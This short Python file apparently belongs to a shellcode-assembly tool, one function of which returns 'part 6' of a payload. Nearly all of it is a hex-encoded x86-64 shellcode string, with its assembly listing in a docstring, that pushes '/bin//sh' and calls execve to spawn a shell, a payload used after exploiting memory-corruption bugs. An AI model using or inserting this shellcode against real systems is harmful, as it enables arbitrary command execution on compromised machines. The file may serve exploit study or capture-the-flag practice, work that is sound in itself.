#!/usr/bin/env python3
import random
from func_instu import *

def partie6():
    part6 = [
        '\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05'
    ]

    """
    
    ; part 6
	xor rsi, rsi
	push rsi
	mov rdi, 0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	mov al, 59
	cdq
	syscall
    
    """

    #print("Partie 6 : ",part6)
    #print(" ")

    return part6